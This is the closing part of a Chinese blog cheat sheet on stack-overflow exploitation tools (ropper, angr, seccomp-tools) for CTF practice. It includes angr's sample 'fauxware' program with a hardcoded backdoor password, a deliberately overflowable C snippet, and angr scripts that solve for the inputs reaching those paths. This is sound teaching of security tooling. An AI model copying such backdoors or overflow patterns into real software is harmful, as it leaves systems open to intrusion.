<h2 id="0xA9-ropper"><a href="#0xA9-ropper" class="headerlink" title="0xA9 ropper"></a>0xA9 ropper</h2><p>类似ropgadget的工具，但是输出更好看一点，找到的gadgets貌似也更多一点，安装如下。前文中的dockerfile集成了ropper。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install ropper</span><br></pre></td></tr></table></figure>



<p>如下图所示。</p>
<p><img src="/2021/08/14/StackOverflow-CheatSheet/13.png"></p>
<h2 id="0xA9-Angr"><a href="#0xA9-Angr" class="headerlink" title="0xA9 Angr"></a>0xA9 Angr</h2><p>angr是一个python库，主要用来求解多种约束下的某一条程序路径所对应的输入。angr的安装如下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-dev libffi-dev build-essential virtualenvwrapper</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>不过angr非常大，所以一般推荐使用angr的docker。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># install docker</span></span><br><span class="line"><span class="comment"># curl -sSL https://get.docker.com/ | sudo sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pull the docker image</span></span><br><span class="line">sudo docker pull angr/angr</span><br><span class="line"></span><br><span class="line"><span class="comment"># run it</span></span><br><span class="line">sudo docker run -it angr</span><br></pre></td></tr></table></figure>



<p>angr主要是为了逆向而生，比如某程序有如下约束条件才可以继续执行。该程序来自angr官方示例。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *sneaky = <span class="string">&quot;SOSNEAKY&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">authenticate</span><span class="params">(<span class="keyword">char</span> *username, <span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> stored_pw[<span class="number">9</span>];</span><br><span class="line">	stored_pw[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> pwfile;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// evil back d00r</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strcmp</span>(password, sneaky) == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	pwfile = open(username, O_RDONLY);</span><br><span class="line">	read(pwfile, stored_pw, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strcmp</span>(password, stored_pw) == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accepted</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to the admin console, trusted user!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rejected</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Go away!&quot;</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> username[<span class="number">9</span>];</span><br><span class="line">	<span class="keyword">char</span> password[<span class="number">9</span>];</span><br><span class="line">	<span class="keyword">int</span> authed;</span><br><span class="line"></span><br><span class="line">	username[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">	password[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Username: \n&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>, username, <span class="number">8</span>);</span><br><span class="line">	read(<span class="number">0</span>, &amp;authed, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Password: \n&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>, password, <span class="number">8</span>);</span><br><span class="line">	read(<span class="number">0</span>, &amp;authed, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	authed = authenticate(username, password);</span><br><span class="line">	<span class="keyword">if</span> (authed) accepted();</span><br><span class="line">	<span class="keyword">else</span> rejected();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>该程序要求我们输入一个正确的用户名和密码，通过手工逆向是可以很容易找到的，但是利用angr的脚本如下，其中fauxware是程序名，最后打印出了所有可能的通过检查的路径分支所对应的输入。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">basic_symbolic_execution</span>():</span></span><br><span class="line">    p = angr.Project(<span class="string">&#x27;fauxware&#x27;</span>)</span><br><span class="line">    state = p.factory.entry_state()</span><br><span class="line"></span><br><span class="line">    path = p.factory.path(state)</span><br><span class="line"></span><br><span class="line">    pathgroup = p.factory.path_group(path)</span><br><span class="line">    pathgroup.step(until=<span class="keyword">lambda</span> lpg: len(lpg.active) &gt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(pathgroup.active)):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;possible %d: &quot;</span> % i, pathgroup.active[i].state.posix.dumps(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">print</span> basic_symbolic_execution()</span><br></pre></td></tr></table></figure>



<p>假设有如下存在栈溢出的程序，但是首先需要我们输入一个密码才可以进入触发栈溢出的函数。为了简化难度，直接假设密码比较简单，但是实际情况下手工逆向出密码非常复杂。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    char buf[<span class="number">20</span>]</span><br><span class="line">    char name[<span class="number">9</span>];</span><br><span class="line">    scanf(<span class="string">&quot;%s&quot;</span>,name);</span><br><span class="line">    <span class="keyword">if</span>(!strcmp(name,<span class="string">&quot;jsk&quot;</span>))&#123;</span><br><span class="line">    	read(<span class="number">0</span>, buf, <span class="number">0x20</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	printf(<span class="string">&quot;failed\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>求解这类问题的angr脚本如下。其中pwn为二进制程序名，find参数为成功的路径的地址，对应到程序中就是main中调用read的地址，avoid参数为失败的路径的地址，对应到程序中就是main中调用printf的地址，最后打印出找到的可以到达成功路径地址的输入。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    p = angr.Project(<span class="string">&quot;pwn&quot;</span>)</span><br><span class="line">    state = p.factory.entry_state()</span><br><span class="line">    sm = p.factory.simgr(state)</span><br><span class="line">    sm.explore(find=<span class="number">0x0804939D</span>, avoid=<span class="number">0x080493B1</span>)</span><br><span class="line">    print(sm.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>



<p>一个真实的ctf示例如下，首先要求我们输入一个key，通过一系列检查这个函数才会返回1，表示输入了正确的key，才可能会触发后续的漏洞利用，在这种场景下angr是最合适的。</p>
<p><img src="/2021/08/14/StackOverflow-CheatSheet/15.png"></p>
<h2 id="0xAA-seccomp-tools"><a href="#0xAA-seccomp-tools" class="headerlink" title="0xAA seccomp-tools"></a>0xAA seccomp-tools</h2><p>检查程序开启的seccomp沙箱策略。安装如下。前文中的dockerfile集成了seccomp-tools。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install seccomp-tools</span><br></pre></td></tr></table></figure>



<p>如下图所示。</p>
<p><img src="/2021/08/14/StackOverflow-CheatSheet/14.png"></p>
<p>以上图为例，只允许的系统调用为re_sigreturn，sigreturn，exit_group，exit，open，read，write。需要注意的是要是用该工具检查elf的沙箱策略，该工具必须先运行一遍elf文件。</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Pwn/" rel="tag"># Pwn</a>
              <a href="/tags/CheatSheet/" rel="tag"># CheatSheet</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/" rel="prev" title="Pwnable.KR Writeup of Toddler's Bottle">
      <i class="fa fa-chevron-left"></i> Pwnable.KR Writeup of Toddler's Bottle
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  

  </div>


          </div>
          
    <div class="comments" id="gitalk-container"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0-%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-number">1.</span> <span class="nav-text">0x0 寄存器</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x1-%E6%A0%88"><span class="nav-number">2.</span> <span class="nav-text">0x1 栈</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x2-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">0x2 函数调用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x3-%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="nav-number">4.</span> <span class="nav-text">0x3 栈溢出</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x4-ROP"><span class="nav-number">5.</span> <span class="nav-text">0x4 ROP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x5-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-number">6.</span> <span class="nav-text">0x5 系统调用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x6-Shellcode"><span class="nav-number">7.</span> <span class="nav-text">0x6 Shellcode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x7-Libc"><span class="nav-number">8.</span> <span class="nav-text">0x7 Libc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x8-Protection-Bypass"><span class="nav-number">9.</span> <span class="nav-text">0x8 Protection Bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x80-%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87"><span class="nav-number">9.1.</span> <span class="nav-text">0x80 常用绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x81-Bypass-ASLR"><span class="nav-number">9.2.</span> <span class="nav-text">0x81 Bypass ASLR</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x82-Bypass-Canary"><span class="nav-number">9.3.</span> <span class="nav-text">0x82 Bypass Canary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x83-Bypass-NX"><span class="nav-number">9.4.</span> <span class="nav-text">0x83 Bypass NX</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x84-Bypass-PIE"><span class="nav-number">9.5.</span> <span class="nav-text">0x84 Bypass PIE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x85-ret2csu"><span class="nav-number">9.6.</span> <span class="nav-text">0x85 ret2csu</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x86-ret2dlresolve"><span class="nav-number">9.7.</span> <span class="nav-text">0x86 ret2dlresolve</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x88-BROP"><span class="nav-number">9.8.</span> <span class="nav-text">0x88 BROP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x89-SROP"><span class="nav-number">9.9.</span> <span class="nav-text">0x89 SROP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x8A-JOP"><span class="nav-number">9.10.</span> <span class="nav-text">0x8A JOP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x8B-COP"><span class="nav-number">9.11.</span> <span class="nav-text">0x8B COP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x8C-Stack-Pivoting"><span class="nav-number">9.12.</span> <span class="nav-text">0x8C Stack Pivoting</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x8D-Frame-Faking"><span class="nav-number">9.13.</span> <span class="nav-text">0x8D Frame Faking</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x8E-Other-Tricks"><span class="nav-number">9.14.</span> <span class="nav-text">0x8E Other Tricks</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x9-C"><span class="nav-number">10.</span> <span class="nav-text">0x9 C++</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0xA-Tools"><span class="nav-number">11.</span> <span class="nav-text">0xA Tools</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0xA0-Docker"><span class="nav-number">11.1.</span> <span class="nav-text">0xA0 Docker</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xA1-IDA"><span class="nav-number">11.2.</span> <span class="nav-text">0xA1 IDA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xA2-GDB-amp-pwndbg"><span class="nav-number">11.3.</span> <span class="nav-text">0xA2 GDB&amp;pwndbg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xA3-pwntools"><span class="nav-number">11.4.</span> <span class="nav-text">0xA3 pwntools</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xA4-checksec"><span class="nav-number">11.5.</span> <span class="nav-text">0xA4 checksec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xA5-asm-online"><span class="nav-number">11.6.</span> <span class="nav-text">0xA5 asm online</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xA6-libc-database"><span class="nav-number">11.7.</span> <span class="nav-text">0xA6 libc-database</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xA7-ROPgadgets"><span class="nav-number">11.8.</span> <span class="nav-text">0xA7 ROPgadgets</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xA8-one-gadget"><span class="nav-number">11.9.</span> <span class="nav-text">0xA8 one_gadget</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xA9-ropper"><span class="nav-number">11.10.</span> <span class="nav-text">0xA9 ropper</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xA9-Angr"><span class="nav-number">11.11.</span> <span class="nav-text">0xA9 Angr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xAA-seccomp-tools"><span class="nav-number">11.12.</span> <span class="nav-text">0xAA seccomp-tools</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Srpopty</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">28</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Srpopty" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Srpopty" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:srpopty@outlook.com" title="E-Mail → mailto:srpopty@outlook.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 2016 – 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Srpopty</span>
</div>

        








      </div>
    </footer>
  </div>

  
  
  <script color='255,255,255' opacity='1' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">

<script>
NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
    var gitalk = new Gitalk({
      clientID    : 'fb9b672afa74e328fbe8',
      clientSecret: '7b3efe103d7e694008b943a67e5273ad36ee14a0',
      repo        : 'srpopty.github.io',
      owner       : 'Srpopty',
      admin       : ['Srpopty'],
      id          : '0502986deb37a82e7a4ac491f78b17d7',
        language: 'en',
      distractionFreeMode: true
    });
    gitalk.render('gitalk-container');
  }, window.Gitalk);
});
</script><!-- hexo-inject:begin --><!-- hexo-inject:end -->

</body>
</html>
